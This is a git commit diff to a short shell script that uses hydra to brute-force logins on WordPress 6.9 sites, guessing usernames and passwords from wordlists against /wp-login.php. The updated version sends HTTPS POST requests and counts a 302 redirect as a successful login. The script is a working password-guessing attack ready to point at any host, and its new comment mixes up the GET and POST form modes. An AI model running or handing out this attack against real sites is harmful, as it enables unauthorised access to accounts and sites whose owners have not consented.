0116728b4056d53741de065df20ad81373f2941f
hackingyseguridad <antonio_taboada@hotmail.es>
2026-02-08 09:16:39 +0100

    Update brutehttp8.sh

--- brutehttp8.sh
+++ brutehttp8.sh
@@ -1,7 +1,8 @@
 # Script basico para fuerza bruta http con hydra en  WordPress version 6.9
 # Uso.: sh brutehttp8.sh fqdn
-# http-get-form     http-post-form 
-#
-hydra -L usuarios0.txt -P claves0.txt $1 $2 http-get-form  \
-"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" \
+# POST http-get-form  GET http-post-form 
+# @antonio_taboada
+
+hydra -L usuarios0.txt -P claves0.txt $1 $2 https-post-form \
+"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=302" \
 -t 4 -w 10 -V
